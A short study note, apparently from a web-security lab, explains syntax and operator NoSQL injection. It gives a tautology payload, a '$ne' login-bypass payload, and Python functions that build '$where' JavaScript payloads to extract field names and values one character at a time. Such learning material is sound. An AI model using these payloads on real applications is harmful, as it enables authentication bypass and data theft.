## Types of NoSQL injection
There are two different types of NoSQL injection:
- **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
	- `this.category == 'fizzy'||'1'=='1'`
- **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.
	- `{"username":"administrator","password":{"$ne":"invalid"}}`
- NoSQL doesn't support string indexing like `username[0]` so you need to use `regex`
```python
# for knowing attributes
def create_payload(character, counter):
    s = "{"
    e = "}"
    js = f"Object.keys(this)[1].match('^.{s}{counter}{e}{character}')"
    return {
        "username": "carlos",
        "password": {"$ne": "x"},
        "$where": js
    }


# for values
def create_payload(character, counter):
    js = f"this.username.charAt({counter}) == '{character}'"
    return {
        "username": "carlos",
        "password": {"$ne": "x"},
        "$where": js
    }
```
